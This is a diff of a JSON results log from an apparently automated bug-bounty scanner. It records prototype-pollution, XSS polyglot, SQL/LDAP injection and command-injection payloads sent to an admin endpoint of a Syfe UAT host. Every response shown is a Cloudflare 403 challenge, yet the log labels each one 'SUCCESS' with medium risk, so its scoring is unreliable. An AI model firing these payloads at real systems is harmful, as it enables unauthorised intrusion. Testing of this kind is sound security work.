@@ -6,109 +6,1021 @@
       "User-Agent": "ShadowFoxAgent/1.0",
       "X-HackerOne-Research": "H1:whitefox980"
     },
+    "target_root": "https://uat-bugbounty.nonprod.syfe.com",
     "stealth_mode": true,
     "aggression_level": "low",
     "retries": 1,
     "timeout": 10,
     "verbose": false
   },
-  "analysis_summary": {},
-  "payload_effectiveness": {
-    "all_payloads": {},
-    "top_effective_payloads": {},
-    "payload_categories_performance": {},
-    "recommendations": []
+  "evaluation_summary": {
+    "timestamp": "2025-06-08T14:02:37.921920",
+    "total_attacks_analyzed": 100,
+    "effective_attacks": 99,
+    "overall_risk": "MEDIUM",
+    "ai_score": 3.23,
+    "ai_grade": "B",
+    "recommendations_count": 2
   },
-  "parameter_risk_analysis": {
-    "all_parameters": {},
-    "high_risk_parameters": {},
-    "risk_distribution": {
+  "payload_analysis": {
+    "total_payloads": 100,
+    "effective_payloads": 99,
+    "payload_categories": {
+      "SQL_INJECTION": 100,
+      "COMMAND_INJECTION": 100,
+      "SSRF": 100,
+      "XXE": 100,
+      "IDOR": 100,
+      "XSS": 19
+    },
+    "top_payloads": [
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "__PROTO__",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "case_mix",
+          "mutation_strategy": "evasive",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "__PROTO__",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.694,
+            "content_length": 7022,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:35 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5b8399e97d4\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5b8399e97d4-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:34"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "polyglot_1",
+          "mutation_strategy": "polyglot",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.713,
+            "content_length": 8484,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:36 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5c2c974f4c8\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5c2c974f4c8-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:36"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "' OR '1'='1' UNION SELECT NULL-- &user=admin)(|(objectClass=*))",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "polyglot_2",
+          "mutation_strategy": "polyglot",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "' OR '1'='1' UNION SELECT NULL-- &user=admin)(|(objectClass=*))",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.499,
+            "content_length": 7386,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:38 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5cdfa0df3a9\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5cdfa0df3a9-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:38"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": ";echo 'XSS'><script>alert('XSS')</script>",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "polyglot_3",
+          "mutation_strategy": "polyglot",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": ";echo 'XSS'><script>alert('XSS')</script>",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.539,
+            "content_length": 7281,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:40 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5d81969c9dc\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5d81969c9dc-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:39"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "__proto__[test]=<script>alert('XSS')</script>",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "polyglot_4",
+          "mutation_strategy": "polyglot",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "__proto__[test]=<script>alert('XSS')</script>",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.503,
+            "content_length": 7287,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:41 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5e1cb36e40d\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5e1cb36e40d-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:41"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "{7*7}<script>alert(49)</script>",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "polyglot_5",
+          "mutation_strategy": "polyglot",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "{7*7}<script>alert(49)</script>",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.542,
+            "content_length": 7212,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:43 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5ec58c1e409\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5ec58c1e409-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:43"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "{\"__proto__\":{\"isAdmin\":true}}",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "contextual_api_1",
+          "mutation_strategy": "contextual",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "{\"__proto__\":{\"isAdmin\":true}}",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.488,
+            "content_length": 7231,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:44 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
